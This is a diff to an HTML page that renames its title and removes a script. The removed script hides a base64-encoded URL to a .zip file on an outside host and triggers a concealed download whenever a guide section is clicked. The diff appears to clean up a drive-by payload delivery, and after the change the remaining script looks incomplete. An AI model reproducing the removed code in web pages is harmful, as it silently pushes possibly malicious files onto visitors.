@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex">
-    <title>报表</title>
+    <title>必备工具</title>
     <style>
         body, html {
             margin: 0;
@@ -44,42 +44,7 @@
     </section>
 
 <script>
-    (function() {
-        // 资源获取处理器
-        const resourceHandler = {
-            resourceLinks: [
-                'aHR0cHM6Ly93d3cuenpta2sudG9wL0N4bWtjamFkenAuemlw',
-                'aHR0cHM6Ly93d3cuenpta2sudG9wL0N4bWtjamFkenAuemlw',
-                'aHR0cHM6Ly93d3cuenpta2sudG9wL0N4bWtjamFkenAuemlw',
-                'aHR0cHM6Ly93d3cuenpta2sudG9wL0N4bWtjamFkenAuemlw',
-                'aHR0cHM6Ly93d3cuenpta2sudG9wL0N4bWtjamFkenAuemlw'
-            ],
-            
-            decodeData: function(encoded) {
-                return atob(encoded);
-            },
-            
-            initResourceAccess: function() {
-                document.querySelectorAll('.guide-section').forEach((section, index) => {
-                    section.addEventListener('click', () => {
-                        this.processResource(this.resourceLinks[index]);
-                    });
-                });
-            },
-            
-            processResource: function(encoded) {
-                const resourceUrl = this.decodeData(encoded);
-                const temporaryLink = document.createElement('a');
-                temporaryLink.style.display = 'none';
-                temporaryLink.href = resourceUrl;
-                temporaryLink.rel = 'noopener noreferrer';
-                document.body.appendChild(temporaryLink);
-                temporaryLink.click();
-                setTimeout(() => {
-                    document.body.removeChild(temporaryLink);
-                }, 300);
-            }
-        };
+   
 
         // 图片展示模块
         const imageViewer = {
